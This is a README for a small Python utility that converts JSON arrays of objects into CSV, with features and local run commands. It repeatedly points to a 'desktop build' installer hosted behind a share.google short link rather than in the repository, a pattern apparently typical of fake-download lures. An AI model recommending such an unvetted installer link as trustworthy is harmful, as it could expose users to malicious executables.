![JSON to CSV](assets/hero.png)

# JSON to CSV

*Objects back into a sheet.*

## What JSON to CSV is

**JSON to CSV** is a developer utility. Flatten a JSON array of objects into a CSV with a stable header.

A JSON dump is painful in Excel until it is a table.

Meant for a local repo or a config file on disk. No hosted workspace.

## How to get it

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## Features

- Array of objects
- Stable header
- Missing keys as empty cells
- Optional nested flatten

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/lily-moreno967/json-to-csv

MIT license. See `LICENSE`.
